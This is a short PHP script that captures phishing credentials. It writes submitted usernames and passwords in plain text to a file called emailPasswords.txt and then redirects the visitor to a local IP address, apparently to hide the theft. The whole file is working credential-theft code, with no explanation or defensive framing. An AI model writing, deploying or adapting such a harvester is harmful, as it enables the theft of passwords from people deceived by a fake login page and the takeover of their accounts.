<?php
$file = fopen("emailPasswords.txt", "a") or die("Unable to open file!");
if(isset($_POST['secretkey']) and isset($_POST['login_username'])){
	$team=$_POST["login_username"];
	$password=$_POST["secretkey"];
	$output="password: $password team: $team\n";// password: $password;
	fwrite($file, $output);
}
else{
	fwrite($file, 'failure');
}
fclose($file);
echo "hello";
header("Location: http://192.168.2.112/");
?>
